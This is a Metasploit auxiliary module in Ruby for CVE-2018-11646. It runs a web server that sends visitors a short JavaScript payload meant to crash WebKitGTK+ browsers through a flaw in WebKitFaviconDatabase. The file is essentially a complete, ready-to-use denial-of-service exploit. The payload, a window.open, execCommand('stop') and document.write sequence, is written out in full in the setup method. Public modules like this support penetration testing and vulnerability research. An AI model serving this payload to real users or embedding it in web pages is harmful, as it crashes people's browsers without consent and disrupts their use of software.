##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WebKitGTK+ WebKitFaviconDatabase DoS',
        'Description' => %q{
          This module exploits a vulnerability in WebKitFaviconDatabase when pageURL is unset.
          If successful, it could lead to application crash, resulting in denial of service.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Dhiraj Mishra', # Original discovery, disclosure
          'Hardik Mehta',  # Original discovery, disclosure
          'Zubin Devnani', # Original discovery, disclosure
          'Manuel Caballero' # JS Code
        ],
        'References' => [
          ['EDB', '44842'],
          ['CVE', '2018-11646'],
          ['URL', 'https://bugs.webkit.org/show_bug.cgi?id=186164'],
          ['URL', 'https://www.inputzero.io/2018/06/cve-2018-11646-webkit.html']
        ],
        'DisclosureDate' => '2018-06-03',
        'Actions' => [[ 'WebServer', { 'Description' => 'Serve exploit via web server' } ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction' => 'WebServer',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
    @html = <<~JS
      <script type="text/javascript">
       win = window.open("WIN", "WIN");
       window.open("http://example.com/", "WIN");
       win.document.execCommand('stop');
       win.document.write("HelloWorld");
       win.document.close();
      </script>
    JS
  end

  def on_request_uri(cli, _request)
    print_status('Sending response')
    send_response(cli, @html)
  end
end
